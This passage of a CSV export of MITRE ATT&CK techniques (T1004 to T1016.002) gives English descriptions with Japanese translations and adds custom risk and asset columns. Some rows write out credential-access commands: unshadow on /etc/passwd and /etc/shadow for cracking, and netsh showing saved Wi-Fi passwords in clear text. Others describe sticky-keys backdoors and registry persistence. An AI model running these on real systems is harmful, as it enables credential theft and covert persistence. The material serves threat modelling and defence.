攻撃者は、<code>cat</code>コマンドなどのコマンドラインユーティリティを介して、Linuxシステム上の<code>/etc/passwd</code>および<code>/etc/shadow</code>ファイルを読み取ったりダンプしたりしようとする可能性があります。(引用元: Arctic Wolf) さらに、Linuxユーティリティ<code>unshadow</code>を使用すると、John the Ripperなどのパスワードクラッキングツールに適した形式で両ファイルを結合できます。例えば、以下のコマンドで実行可能です：<code>/usr/bin/unshadow /etc/passwd /etc/shadow > /tmp/crack.password.db</code>(引用元: nixCraft - John the Ripper)。 <code>/etc/passwd</code>に保存されているユーザー情報は<code>/etc/shadow</code>のパスワードハッシュと関連付けられているため、攻撃者は両方にアクセスできる必要があります。,credential-access,Linux,credential_abuse,credential_gain,authentication_system;privileged_account;user_interaction;endpoint_execution;file_storage_access;logging_monitoring,specified,Business Workstation;Log / Monitoring Server;Server (On-Prem/VM),subtechnique;has_created_ts;has_modified_ts,S3,S3,C03,Secondary Intrusion,C03,Secondary Intrusion,TA0006,attack-pattern--d0b4fcdb-d67d-4ed2-99ce-788b12f8c0f4,2020-02-11T18:46:56.263Z,2025-04-15T19:59:09.955Z,,,,
T1004,,Winlogon Helper DLL,Winlogon ヘルパー DLL,"Winlogon.exe is a Windows component responsible for actions at logon/logoff as well as the secure attention sequence (SAS) triggered by Ctrl-Alt-Delete. Registry entries in <code>HKLM\Software\[Wow6432Node\]Microsoft\Windows NT\CurrentVersion\Winlogon\</code> and <code>HKCU\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\</code> are used to manage additional helper programs and functionalities that support Winlogon. (Citation: Cylance Reg Persistence Sept 2013) Malicious modifications to these Registry keys may cause Winlogon to load and execute malicious DLLs and/or executables. Specifically, the following subkeys have been known to be possibly vulnerable to abuse: (Citation: Cylance Reg Persistence Sept 2013) * Winlogon\Notify - points to notification package DLLs that handle Winlogon events * Winlogon\Userinit - points to userinit.exe, the user initialization program executed when a user logs on * Winlogon\Shell - points to explorer.exe, the system shell executed when a user logs on Adversaries may take advantage of these features to repeatedly execute malicious code and establish Persistence.",Winlogon.exe は、ログオン/ログオフ時のアクション、および Ctrl-Alt-Delete によってトリガーされるセキュアアテンションシーケンス (SAS) を担当する Windows コンポーネントです。 <code>HKLM\Software\[Wow6432Node\]Microsoft\Windows NT\CurrentVersion\Winlogon\</code> および <code>HKCU\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\</code> のレジストリエントリは、Winlogon をサポートする追加のヘルパープログラムおよび機能を管理するために使用されます。 (引用: Cylance Reg Persistence 2013年9月) これらのレジストリキーへの悪意のある改変により、Winlogonが不正なDLLや実行ファイルを読み込み実行する可能性があります。具体的には、以下のサブキーが悪用される可能性があることが知られています: (引用: Cylance Reg Persistence 2013年9月) * Winlogon\Notify - Winlogonイベントを処理する通知パッケージDLLを指す * Winlogon\Userinit - ユーザーログオン時に実行されるユーザー初期化プログラムuserinit.exeを指す * Winlogon\Shell - ユーザーログオン時に実行されるシステムシェルexplorer.exeを指す 攻撃者はこれらの機能を利用して悪意のあるコードを繰り返し実行し、永続化を確立する可能性があります。,persistence,Windows,script_command_execution,foothold,user_interaction;endpoint_execution;logging_monitoring,specified,Business Workstation;Log / Monitoring Server;Server (On-Prem/VM),revoked;has_created_ts;has_modified_ts,S2,S2,C02,Secondary Action,C02,Secondary Action,TA0003,attack-pattern--514ede4c-78b3-4d78-a38b-daddf6217a79,2017-05-31T21:30:20.148Z,2025-04-25T15:15:31.608Z,,,,
T1005,,Data from Local System,ローカルシステムからのデータ,"Adversaries may search local system sources, such as file systems, configuration files, local databases, or virtual machine files, to find files of interest and sensitive data prior to Exfiltration. Adversaries may do this using a [Command and Scripting Interpreter](https://attack.mitre.org/techniques/T1059), such as [cmd](https://attack.mitre.org/software/S0106) as well as a [Network Device CLI](https://attack.mitre.org/techniques/T1059/008), which have functionality to interact with the file system to gather information.(Citation: show_run_config_cmd_cisco) Adversaries may also use [Automated Collection](https://attack.mitre.org/techniques/T1119) on the local system.",攻撃者は、ファイルシステム、設定ファイル、ローカルデータベース、仮想マシンファイルなどのローカルシステムソースを検索し、情報漏洩前に関心のあるファイルや機密データを見つける可能性があります。 攻撃者は、[コマンドおよびスクリプトインタープリタ](https://attack.mitre.org/techniques/T1059)（例：[cmd](https://attack.mitre.org/software/S0106)）や、ファイルシステムと対話して情報を収集する機能を持つ[ネットワークデバイス CLI](https://attack.mitre.org/techniques/T1059/008) を使用する場合があります。これらは、ファイルシステムと対話して情報を収集する機能を備えています（引用元：show_run_config_cmd_cisco）。また、攻撃者はローカルシステム上で [自動収集](https://attack.mitre.org/techniques/T1119) を使用する場合もあります。,collection,Linux;macOS;Windows;Network Devices;ESXi,script_command_execution,asset_access,endpoint_execution;network_connectivity;file_storage_access;database_access,specified,Business Workstation;Network Device (FW/Proxy/AP);Server (On-Prem/VM),has_created_ts;has_modified_ts,S2,S2,C02,Secondary Action,C02,Secondary Action,TA0009,attack-pattern--3c4a2599-71ee-4405-ba1e-0e28414b4bc5,2017-05-31T21:30:20.537Z,2025-04-15T19:58:24.318Z,,,,
T1006,,Direct Volume Access,直接ボリュームアクセス,"Adversaries may directly access a volume to bypass file access controls and file system monitoring. Windows allows programs to have direct access to logical volumes. Programs with direct access may read and write files directly from the drive by analyzing file system data structures. This technique may bypass Windows file access controls as well as file system monitoring tools. (Citation: Hakobyan 2009) Utilities, such as `NinjaCopy`, exist to perform these actions in PowerShell.(Citation: Github PowerSploit Ninjacopy) Adversaries may also use built-in or third-party utilities (such as `vssadmin`, `wbadmin`, and [esentutl](https://attack.mitre.org/software/S0404)) to create shadow copies or backups of data from system volumes.(Citation: LOLBAS Esentutl)",攻撃者はファイルアクセス制御やファイルシステム監視を回避するため、ボリュームに直接アクセスする可能性があります。Windowsではプログラムが論理ボリュームに直接アクセスできます。直接アクセス権を持つプログラムは、ファイルシステムデータ構造を解析することでドライブから直接ファイルを読み書きできます。この手法はWindowsのファイルアクセス制御やファイルシステム監視ツールを迂回する可能性があります（引用元：Hakobyan 2009）。PowerShellでこれらの操作を実行するユーティリティ（例：`NinjaCopy`）が存在します。(引用: Github PowerSploit Ninjacopy) 攻撃者はまた、組み込みまたはサードパーティ製ユーティリティ（`vssadmin`、`wbadmin`、[esentutl](https://attack.mitre.org/software/S0404)など）を使用して、システムボリュームからのデータのシャドウコピーまたはバックアップを作成する可能性がある。(引用: LOLBAS Esentutl),defense-evasion,Network Devices;Windows,script_command_execution,stealth,endpoint_execution;file_storage_access;logging_monitoring,specified,Backup Server;Business Workstation;Log / Monitoring Server;Network Device (FW/Proxy/AP);Server (On-Prem/VM),has_created_ts;has_modified_ts,S2,S2,C02,Secondary Action,C02,Secondary Action,TA0005,attack-pattern--0c8ab3eb-df48-4b9c-ace7-beacaac81cc5,2017-05-31T21:30:20.934Z,2025-04-15T19:58:05.272Z,,,,
T1007,,System Service Discovery,システムサービスの検出,"Adversaries may try to gather information about registered local system services. Adversaries may obtain information about services using tools as well as OS utility commands such as <code>sc query</code>, <code>tasklist /svc</code>, <code>systemctl --type=service</code>, and <code>net start</code>. Adversaries may use the information from [System Service Discovery](https://attack.mitre.org/techniques/T1007) during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.",攻撃者は、登録済みのローカルシステムサービスに関する情報を収集しようとする可能性があります。攻撃者は、ツールや<code>sc query</code>、<code>tasklist /svc</code>、<code>systemctl --type=service</code>、<code>net start</code>などのOSユーティリティコマンドを使用してサービス情報を取得する可能性があります。 攻撃者は、自動検出中に [システムサービスの検出](https://attack.mitre.org/techniques/T1007) から得た情報を使用して、ターゲットを完全に感染させるかどうかや特定のアクションを試みるかどうかなど、その後の行動を決定する場合があります。,discovery,Windows;macOS;Linux,script_command_execution,situational_awareness,endpoint_execution,specified,Business Workstation;Server (On-Prem/VM),has_created_ts;has_modified_ts,S2,S2,C02,Secondary Action,C02,Secondary Action,TA0007,attack-pattern--322bad5a-1c49-4d23-ab79-76d641794afa,2017-05-31T21:30:21.315Z,2025-04-15T23:14:33.837Z,,,,
T1008,,Fallback Channels,フォールバックチャネル,Adversaries may use fallback or alternate communication channels if the primary channel is compromised or inaccessible in order to maintain reliable command and control and to avoid data transfer thresholds.,攻撃者は、信頼性の高いコマンド＆コントロールを維持し、データ転送の制限を回避するために、プライマリチャネルが侵害されたりアクセス不能になった場合に、フォールバックまたは代替の通信チャネルを使用する場合があります。,command-and-control,Linux;Windows;macOS;ESXi,script_command_execution,remote_control,endpoint_execution,specified,Business Workstation;Server (On-Prem/VM),has_created_ts;has_modified_ts,S4,S4,C04,Final Impact,C04,Final Impact,TA0011,attack-pattern--f24faf46-3b26-4dbb-98f2-63460498e433,2017-05-31T21:30:21.689Z,2025-04-25T15:16:21.879Z,,,,
T1009,,Binary Padding,バイナリパディング,"Adversaries can use binary padding to add junk data and change the on-disk representation of malware without affecting the functionality or behavior of the binary. This will often increase the size of the binary beyond what some security tools are capable of handling due to file size limitations. Binary padding effectively changes the checksum of the file and can also be used to avoid hash-based blacklists and static anti-virus signatures.(Citation: ESET OceanLotus) The padding used is commonly generated by a function to create junk data and then appended to the end or applied to sections of malware.(Citation: Securelist Malware Tricks April 2017) Increasing the file size may decrease the effectiveness of certain tools and detection capabilities that are not designed or configured to scan large files. This may also reduce the likelihood of being collected for analysis. Public file scanning services, such as VirusTotal, limits the maximum size of an uploaded file to be analyzed.(Citation: VirusTotal FAQ)",攻撃者はバイナリパディングを用いて、バイナリの機能や動作に影響を与えずにジャンクデータを追加し、マルウェアのディスク上での表現を変更できる。これにより、ファイルサイズ制限により一部のセキュリティツールが処理可能な範囲を超えるバイナリサイズが増大することが多い。バイナリパディングはファイルのチェックサムを効果的に変更し、ハッシュベースのブラックリストや静的アンチウイルスシグネチャを回避するためにも使用される。(引用元: ESET OceanLotus) 使用されるパディングは通常、ジャンクデータ生成関数で生成され、マルウェアの末尾に追加されるか、特定セクションに適用される。(引用元: Securelist Malware Tricks 2017年4月) ファイルサイズを増加させることで、大容量ファイルのスキャンに対応していないツールや検知機能の有効性が低下する可能性がある。これにより、分析目的での収集可能性も低下する。 VirusTotalなどの公開ファイルスキャンサービスは、分析対象のアップロードファイルの最大サイズを制限している。(引用元: VirusTotal FAQ),defense-evasion,Linux;macOS;Windows,data_collection,stealth,file_storage_access,specified,Business Workstation;Server (On-Prem/VM),revoked;has_created_ts;has_modified_ts,S2,S2,C02,Secondary Action,C02,Secondary Action,TA0005,attack-pattern--519630c5-f03f-4882-825c-3af924935817,2017-05-31T21:30:22.096Z,2025-04-25T15:15:31.768Z,,,,
T1010,,Application Window Discovery,アプリケーションウィンドウの検出,"Adversaries may attempt to get a listing of open application windows. Window listings could convey information about how the system is used.(Citation: Prevailion DarkWatchman 2021) For example, information about application windows could be used identify potential data to collect as well as identifying security tooling ([Security Software Discovery](https://attack.mitre.org/techniques/T1518/001)) to evade.(Citation: ESET Grandoreiro April 2020) Adversaries typically abuse system features for this type of enumeration. For example, they may gather information through native system features such as [Command and Scripting Interpreter](https://attack.mitre.org/techniques/T1059) commands and [Native API](https://attack.mitre.org/techniques/T1106) functions.",攻撃者は開いているアプリケーションウィンドウの一覧を取得しようとする可能性がある。ウィンドウ一覧はシステムの使用状況に関する情報を伝える可能性がある。（出典：Prevailion DarkWatchman 2021） 例えば、アプリケーションウィンドウに関する情報は、収集すべき潜在的なデータの特定や、回避すべきセキュリティツール（[セキュリティソフトウェアの発見](https://attack.mitre.org/techniques/T1518/001)）の特定に利用される可能性がある。（引用元：ESET Grandoreiro 2020年4月）敵対者は通常、この種の列挙のためにシステム機能を悪用する。 たとえば、[コマンドおよびスクリプトインタープリタ](https://attack.mitre.org/techniques/T1059) コマンドや [ネイティブ API](https://attack.mitre.org/techniques/T1106) 関数などのネイティブシステム機能を通じて情報を収集する場合があります。,discovery,macOS;Windows;Linux,script_command_execution,situational_awareness,endpoint_execution;cloud_control_plane,specified,Business Workstation;Server (On-Prem/VM),has_created_ts;has_modified_ts,S2,S2,C02,Secondary Action,C02,Secondary Action,TA0007,attack-pattern--4ae4f953-fe58-4cc8-a327-33257e30a830,2017-05-31T21:30:24.512Z,2025-04-15T21:49:50.019Z,,,,
T1011,,Exfiltration Over Other Network Medium,他のネットワーク媒体を介した情報漏洩,"Adversaries may attempt to exfiltrate data over a different network medium than the command and control channel. If the command and control network is a wired Internet connection, the exfiltration may occur, for example, over a WiFi connection, modem, cellular data connection, Bluetooth, or another radio frequency (RF) channel. Adversaries may choose to do this if they have sufficient access or proximity, and the connection might not be secured or defended as well as the primary Internet-connected channel because it is not routed through the same enterprise network.",敵対者は、コマンド＆コントロールチャネルとは異なるネットワーク媒体を介してデータを外部に流出させようと試みる場合があります。コマンド＆コントロールネットワークが有線インターネット接続である場合、流出は、たとえば、WiFi 接続、モデム、携帯電話データ接続、Bluetooth、またはその他の無線周波数 (RF) チャネルを介して発生する可能性があります。 攻撃者は、十分なアクセス権や近接性がある場合にこの方法を選択する可能性があり、その接続は、同じ企業ネットワークを経由していないため、主要なインターネット接続チャネルほど十分に保護または防御されていない可能性があります。,exfiltration,Linux;macOS;Windows,script_command_execution,data_outflow,endpoint_execution;network_connectivity,specified,Business Workstation;File Server;My Number Administrative System on GovCloud;Server (On-Prem/VM);Wireless Access Point,has_created_ts;has_modified_ts,S4,S4,C04,Final Impact,C04,Final Impact,TA0010,attack-pattern--51ea26b1-ff1e-4faa-b1a0-1114cd298c87,2017-05-31T21:30:25.159Z,2025-04-15T22:29:20.961Z,,,,
T1011.001,T1011,Exfiltration Over Bluetooth,Bluetooth経由のデータ流出,"Adversaries may attempt to exfiltrate data over Bluetooth rather than the command and control channel. If the command and control network is a wired Internet connection, an adversary may opt to exfiltrate data using a Bluetooth communication channel. Adversaries may choose to do this if they have sufficient access and proximity. Bluetooth connections might not be secured or defended as well as the primary Internet-connected channel because it is not routed through the same enterprise network.",攻撃者は、コマンド＆コントロールチャネルではなくBluetooth経由でデータを流出させようとする可能性があります。コマンド＆コントロールネットワークが有線インターネット接続である場合、攻撃者はBluetooth通信チャネルを使用してデータを流出させることを選択する可能性があります。攻撃者は、十分なアクセス権と近接性がある場合にこの方法を選択する可能性があります。Bluetooth接続は、同じ企業ネットワークを経由しないため、主要なインターネット接続チャネルほど十分に保護または防御されていない可能性があります。,exfiltration,Linux;macOS;Windows,script_command_execution,data_outflow,endpoint_execution;network_connectivity,specified,Business Workstation;File Server;My Number Administrative System on GovCloud;Server (On-Prem/VM),subtechnique;has_created_ts;has_modified_ts,S4,S4,C04,Final Impact,C04,Final Impact,TA0010,attack-pattern--613d08bc-e8f4-4791-80b0-c8b974340dfd,2020-03-09T17:07:57.392Z,2025-04-15T19:58:35.466Z,,,,
T1012,,Query Registry,レジストリの照会,"Adversaries may interact with the Windows Registry to gather information about the system, configuration, and installed software. The Registry contains a significant amount of information about the operating system, configuration, software, and security.(Citation: Wikipedia Windows Registry) Information can easily be queried using the [Reg](https://attack.mitre.org/software/S0075) utility, though other means to access the Registry exist. Some of the information may help adversaries to further their operation within a network. Adversaries may use the information from [Query Registry](https://attack.mitre.org/techniques/T1012) during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.",攻撃者は、システム、構成、インストール済みソフトウェアに関する情報を収集するためにWindowsレジストリとやり取りする可能性があります。レジストリには、オペレーティングシステム、構成、ソフトウェア、セキュリティに関する膨大な情報が含まれています（出典：Wikipedia Windows Registry）。情報は[Reg](https://attack.mitre.org/software/S0075)ユーティリティを使用して簡単に照会できますが、レジストリにアクセスする他の手段も存在します。 この情報の一部は、攻撃者がネットワーク内で活動を拡大するのに役立つ可能性があります。攻撃者は自動化された探索中に[レジストリクエリ](https://attack.mitre.org/techniques/T1012)から得た情報を活用し、ターゲットへの完全な感染の可否や特定のアクションの試行を含む、その後の行動を決定する可能性があります。,discovery,Windows,config_policy_manipulation,situational_awareness,network_connectivity,specified,Business Workstation;Server (On-Prem/VM),has_created_ts;has_modified_ts,S2,S2,C02,Secondary Action,C02,Secondary Action,TA0007,attack-pattern--c32f7008-9fea-41f7-8366-5eb9b74bd896,2017-05-31T21:30:25.584Z,2025-04-15T22:58:50.612Z,,,,
T1013,,Port Monitors,ポートモニター,"A port monitor can be set through the (Citation: AddMonitor) API call to set a DLL to be loaded at startup. (Citation: AddMonitor) This DLL can be located in <code>C:\Windows\System32</code> and will be loaded by the print spooler service, spoolsv.exe, on boot. The spoolsv.exe process also runs under SYSTEM level permissions. (Citation: Bloxham) Alternatively, an arbitrary DLL can be loaded if permissions allow writing a fully-qualified pathname for that DLL to <code>HKLM\SYSTEM\CurrentControlSet\Control\Print\Monitors</code>. The Registry key contains entries for the following: * Local Port * Standard TCP/IP Port * USB Monitor * WSD Port Adversaries can use this technique to load malicious code at startup that will persist on system reboot and execute as SYSTEM.",ポートモニターは、起動時にDLLをロードするように設定する(引用: AddMonitor) API呼び出しを通じて設定可能です。(引用: AddMonitor) このDLLは<code>C:\Windows\System32</code>に配置でき、起動時に印刷スプーラーサービス(spoolsv.exe)によってロードされます。spoolsv.exeプロセスもSYSTEMレベルの権限で実行されます。 (引用: Bloxham) あるいは、<code>HKLM\SYSTEM\CurrentControlSet\Control\Print\Monitors</code> にその DLL の完全修飾パス名を書き込む権限があれば、任意の DLL をロードすることも可能です。 レジストリキーには以下のエントリが含まれます：* ローカルポート* 標準TCP/IPポート* USBモニター* WSDポート攻撃者はこの手法を利用し、システム再起動後も永続化しSYSTEM権限で実行される悪意のあるコードを起動時にロードできます。,persistence;privilege-escalation,Windows,config_policy_manipulation,privilege_gain,endpoint_execution;cloud_control_plane;logging_monitoring,specified,Business Workstation;Server (On-Prem/VM),revoked;has_created_ts;has_modified_ts,S2;S3,S2,C02;C03,Secondary Action;Secondary Intrusion,C02,Secondary Action,TA0003;TA0004,attack-pattern--1f47e2fd-fa77-4f2f-88ee-e85df308f125,2017-05-31T21:30:26.057Z,2025-04-25T15:15:14.881Z,,,,
T1014,,Rootkit,ルートキット,"Adversaries may use rootkits to hide the presence of programs, files, network connections, services, drivers, and other system components. Rootkits are programs that hide the existence of malware by intercepting/hooking and modifying operating system API calls that supply system information. (Citation: Symantec Windows Rootkits) Rootkits or rootkit enabling functionality may reside at the user or kernel level in the operating system or lower, to include a hypervisor, Master Boot Record, or [System Firmware](https://attack.mitre.org/techniques/T1542/001). (Citation: Wikipedia Rootkit) Rootkits have been seen for Windows, Linux, and Mac OS X systems. (Citation: CrowdStrike Linux Rootkit) (Citation: BlackHat Mac OSX Rootkit)",攻撃者は、プログラム、ファイル、ネットワーク接続、サービス、ドライバ、その他のシステムコンポーネントの存在を隠すためにルートキットを使用する場合があります。ルートキットは、システム情報を提供するオペレーティングシステムの API 呼び出しを傍受/フックして変更することにより、マルウェアの存在を隠すプログラムです。 (出典: Symantec Windows Rootkits) ルートキットまたはルートキットを有効化する機能は、オペレーティングシステムのユーザーレベルまたはカーネルレベル、あるいはそれ以下のレベル（ハイパーバイザー、マスターブートレコード、[システムファームウェア](https://attack.mitre.org/techniques/T1542/001) を含む）に存在する場合があります。 (引用元: Wikipedia Rootkit) ルートキットは、Windows、Linux、Mac OS Xシステムで確認されている。(引用元: CrowdStrike Linux Rootkit) (引用元: BlackHat Mac OSX Rootkit),defense-evasion,Linux;macOS;Windows,other,stealth,privileged_account;user_interaction;network_connectivity;cloud_control_plane;file_storage_access,specified,Business Workstation;Server (On-Prem/VM),has_created_ts;has_modified_ts,S2,S2,C02,Secondary Action,C02,Secondary Action,TA0005,attack-pattern--0f20e3cb-245b-4a61-8a91-2d93f7cb0e9b,2017-05-31T21:30:26.496Z,2025-04-16T20:37:15.308Z,,,,
T1015,,Accessibility Features,アクセシビリティ機能,"Windows contains accessibility features that may be launched with a key combination before a user has logged in (for example, when the user is on the Windows logon screen). An adversary can modify the way these programs are launched to get a command prompt or backdoor without logging in to the system. Two common accessibility programs are <code>C:\Windows\System32\sethc.exe</code>, launched when the shift key is pressed five times and <code>C:\Windows\System32\utilman.exe</code>, launched when the Windows + U key combination is pressed. The sethc.exe program is often referred to as ""sticky keys"", and has been used by adversaries for unauthenticated access through a remote desktop login screen. (Citation: FireEye Hikit Rootkit) Depending on the version of Windows, an adversary may take advantage of these features in different ways because of code integrity enhancements. In newer versions of Windows, the replaced binary needs to be digitally signed for x64 systems, the binary must reside in <code>%systemdir%\</code>, and it must be protected by Windows File or Resource Protection (WFP/WRP). (Citation: DEFCON2016 Sticky Keys) The debugger method was likely discovered as a potential workaround because it does not require the corresponding accessibility feature binary to be replaced. Examples for both methods: For simple binary replacement on Windows XP and later as well as and Windows Server 2003/R2 and later, for example, the program (e.g., <code>C:\Windows\System32\utilman.exe</code>) may be replaced with ""cmd.exe"" (or another program that provides backdoor access). Subsequently, pressing the appropriate key combination at the login screen while sitting at the keyboard or when connected over [Remote Desktop Protocol](https://attack.mitre.org/techniques/T1076) will cause the replaced file to be executed with SYSTEM privileges. (Citation: Tilbury 2014) For the debugger method on Windows Vista and later as well as Windows Server 2008 and later, for example, a Registry key may be modified that configures ""cmd.exe,"" or another program that provides backdoor access, as a ""debugger"" for the accessibility program (e.g., ""utilman.exe""). After the Registry is modified, pressing the appropriate key combination at the login screen while at the keyboard or when connected with RDP will cause the ""debugger"" program to be executed with SYSTEM privileges. (Citation: Tilbury 2014) Other accessibility features exist that may also be leveraged in a similar fashion: (Citation: DEFCON2016 Sticky Keys) * On-Screen Keyboard: <code>C:\Windows\System32\osk.exe</code> * Magnifier: <code>C:\Windows\System32\Magnify.exe</code> * Narrator: <code>C:\Windows\System32\Narrator.exe</code> * Display Switcher: <code>C:\Windows\System32\DisplaySwitch.exe</code> * App Switcher: <code>C:\Windows\System32\AtBroker.exe</code>",Windows には、ユーザーがログインする前（たとえば、ユーザーが Windows ログオン画面にいるとき）に、キーの組み合わせで起動できるアクセシビリティ機能が含まれています。 攻撃者は、システムにログインせずにコマンドプロンプトやバックドアを取得するために、これらのプログラムの起動方法を変更することができます。一般的なアクセシビリティプログラムとしては、Shiftキーを5回押すと起動する<code>C:\Windows\System32\sethc.exe</code>と、WindowsキーとUキーを同時に押すと起動する<code>C:\Windows\System32\utilman.exe</code>の2つがあります。 sethc.exeプログラムは「スティッキーキー」として知られ、攻撃者がリモートデスクトップログイン画面経由で認証不要アクセスを得る手段として利用されてきた（出典：FireEye Hikit Rootkit）。Windowsのバージョンによっては、コード完全性の強化により攻撃者がこれらの機能を悪用する方法が異なる。 新しいバージョンのWindowsでは、置換されるバイナリはx64システム向けにデジタル署名が必要であり、<code>%systemdir%\</code>に存在し、Windowsファイル保護またはリソース保護（WFP/WRP）によって保護されている必要があります。（引用元：DEFCON2016 Sticky Keys）デバッガー手法は、対応するアクセシビリティ機能バイナリの置換を必要としないため、潜在的な回避策として発見された可能性があります。 両手法の例：Windows XP以降およびWindows Server 2003/R2以降における単純なバイナリ置換例として、プログラム（例：<code>C:\Windows\System32\utilman.exe</code>）を「cmd.exe」（またはバックドアアクセスを提供する別プログラム）で置き換えることが挙げられる。 その後、ログイン画面でキーボード操作時または[Remote Desktop Protocol](https://attack.mitre.org/techniques/T1076)経由接続時に適切なキー操作を行うと、置換されたファイルがSYSTEM権限で実行される。 (引用: Tilbury 2014) 例えば、Windows Vista 以降および Windows Server 2008 以降のデバッガー手法では、アクセシビリティプログラム（例: 「utilman.exe」）の「デバッガー」として「cmd.exe」またはバックドアアクセスを提供する別のプログラムを設定するレジストリキーが変更される場合があります。 レジストリ変更後、ログイン画面でキーボード操作時またはRDP接続時に適切なキー操作を行うと、「デバッガー」プログラムがSYSTEM権限で実行される。 (引用: Tilbury 2014) 同様の手法で悪用可能なその他のアクセシビリティ機能: (引用: DEFCON2016 Sticky Keys) * 画面キーボード: <code>C:\Windows\System32\osk.exe</code> * 拡大鏡: <code>C:\Windows\System32\Magnify.exe</code> * ナレーター: <code>C:\Windows\System32\Narrator.exe</code> * ディスプレイ切替ツール: <code>C:\Windows\System32\DisplaySwitch.exe</code> * アプリ切替ツール: <code>C:\Windows\System32\AtBroker.exe</code>,persistence;privilege-escalation,Windows,remote_service_abuse,privilege_gain,authentication_system;privileged_account;user_interaction;endpoint_execution;network_connectivity;file_storage_access;logging_monitoring,specified,Business Workstation;Log / Monitoring Server;Server (On-Prem/VM),revoked;has_created_ts;has_modified_ts,S2;S3,S2,C02;C03,Secondary Action;Secondary Intrusion,C02,Secondary Action,TA0003;TA0004,attack-pattern--9b99b83a-1aac-4e29-b975-b374950551a3,2017-05-31T21:30:26.946Z,2025-04-25T15:15:54.626Z,,,,
T1016,,System Network Configuration Discovery,システム ネットワーク構成検出,"Adversaries may look for details about the network configuration and settings, such as IP and/or MAC addresses, of systems they access or through information discovery of remote systems. Several operating system administration utilities exist that can be used to gather this information. Examples include [Arp](https://attack.mitre.org/software/S0099), [ipconfig](https://attack.mitre.org/software/S0100)/[ifconfig](https://attack.mitre.org/software/S0101), [nbtstat](https://attack.mitre.org/software/S0102), and [route](https://attack.mitre.org/software/S0103). Adversaries may also leverage a [Network Device CLI](https://attack.mitre.org/techniques/T1059/008) on network devices to gather information about configurations and settings, such as IP addresses of configured interfaces and static/dynamic routes (e.g. <code>show ip route</code>, <code>show ip interface</code>).(Citation: US-CERT-TA18-106A)(Citation: Mandiant APT41 Global Intrusion ) On ESXi, adversaries may leverage esxcli to gather network configuration information. For example, the command `esxcli network nic list` will retrieve the MAC address, while `esxcli network ip interface ipv4 get` will retrieve the local IPv4 address.(Citation: Trellix Rnasomhouse 2024) Adversaries may use the information from [System Network Configuration Discovery](https://attack.mitre.org/techniques/T1016) during automated discovery to shape follow-on behaviors, including determining certain access within the target network and what actions to do next.",攻撃者は、アクセスするシステムやリモートシステムの情報収集を通じて、IPアドレスやMACアドレスなどのネットワーク構成や設定に関する詳細を探る可能性があります。 この情報を収集するために使用できるオペレーティングシステム管理ユーティリティがいくつか存在します。例としては、[Arp](https://attack.mitre.org/software/S0099)、[ipconfig](https://attack.mitre.org/software/S0100)/[ifconfig](https://attack.mitre.org/software/S0101)、 [nbtstat](https://attack.mitre.org/software/S0102)、[route](https://attack.mitre.org/software/S0103)などがあります。 攻撃者はネットワーク機器上の[ネットワーク機器CLI](https://attack.mitre.org/techniques/T1059/008)を利用して、設定されたインターフェースのIPアドレスや静的/動的ルート（例：<code>show ip route</code>、<code>show ip interface</code>）などの構成・設定情報を収集する可能性があります。(引用元: US-CERT-TA18-106A)(引用元: Mandiant APT41 Global Intrusion ) ESXiでは、攻撃者はesxcliを利用してネットワーク構成情報を収集する可能性があります。例えば、コマンド`esxcli network nic list`はMACアドレスを取得し、`esxcli network ip interface ipv4 get`はローカルIPv4アドレスを取得します。(引用元: Trellix Rnasomhouse 2024) 攻撃者は自動探索時に[システムネットワーク構成検出](https://attack.mitre.org/techniques/T1016)から得た情報を活用し、ターゲットネットワーク内での特定アクセス権限の確定や次の行動計画など、追随行動を策定する可能性があります。,discovery,Linux;macOS;Windows;Network Devices;ESXi,script_command_execution,situational_awareness,endpoint_execution;network_connectivity;file_storage_access,specified,Business Workstation;File Server;Network Device (FW/Proxy/AP);Server (On-Prem/VM),has_created_ts;has_modified_ts,S2,S2,C02,Secondary Action,C02,Secondary Action,TA0007,attack-pattern--707399d6-ab3e-4963-9315-d9d3818cd6a0,2017-05-31T21:30:27.342Z,2025-04-15T19:58:40.773Z,,,,
T1016.001,T1016,Internet Connection Discovery,インターネット接続の発見,"Adversaries may check for Internet connectivity on compromised systems. This may be performed during automated discovery and can be accomplished in numerous ways such as using [Ping](https://attack.mitre.org/software/S0097), <code>tracert</code>, and GET requests to websites. Adversaries may use the results and responses from these requests to determine if the system is capable of communicating with their C2 servers before attempting to connect to them. The results may also be used to identify routes, redirectors, and proxy servers.",攻撃者は侵害されたシステムでインターネット接続を確認する場合があります。これは自動化された発見中に実行され、[Ping](https://attack.mitre.org/software/S0097)、<code>tracert</code>、ウェブサイトへのGETリクエストなど様々な方法で達成可能です。 攻撃者は、これらのリクエストの結果と応答を利用して、システムが自身のC2サーバーと通信可能かどうかを判断し、接続を試みる前に確認する可能性がある。結果はまた、経路、リダイレクター、プロキシサーバーを特定するためにも使用される。,discovery,Windows;Linux;macOS;ESXi,discovery_enumeration,situational_awareness,network_connectivity,specified,Business Workstation;Proxy / Gateway;Server (On-Prem/VM),subtechnique;has_created_ts;has_modified_ts,S2,S2,C02,Secondary Action,C02,Secondary Action,TA0007,attack-pattern--132d5b37-aac5-4378-a8dc-3127b18a73dc,2021-03-17T15:28:10.689Z,2025-04-25T14:45:52.631Z,,,,
T1016.002,T1016,Wi-Fi Discovery,Wi-Fi 検出,"Adversaries may search for information about Wi-Fi networks, such as network names and passwords, on compromised systems. Adversaries may use Wi-Fi information as part of [Account Discovery](https://attack.mitre.org/techniques/T1087), [Remote System Discovery](https://attack.mitre.org/techniques/T1018), and other discovery or [Credential Access](https://attack.mitre.org/tactics/TA0006) activity to support both ongoing and future campaigns. Adversaries may collect various types of information about Wi-Fi networks from hosts. For example, on Windows names and passwords of all Wi-Fi networks a device has previously connected to may be available through `netsh wlan show profiles` to enumerate Wi-Fi names and then `netsh wlan show profile “Wi-Fi name Ekey=clear` to show a Wi-Fi network’s corresponding password.(Citation: BleepingComputer Agent Tesla steal wifi passwords)(Citation: Malware Bytes New AgentTesla variant steals WiFi credentials)(Citation: Check Point APT35 CharmPower January 2022) Additionally, names and other details of locally reachable Wi-Fi networks can be discovered using calls to `wlanAPI.dll` [Native API](https://attack.mitre.org/techniques/T1106) functions.(Citation: Binary Defense Emotes Wi-Fi Spreader) On Linux, names and passwords of all Wi-Fi-networks a device has previously connected to may be available in files under ` /etc/NetworkManager/system-connections/`.(Citation: Wi-Fi Password of All Connected Networks in Windows/Linux) On 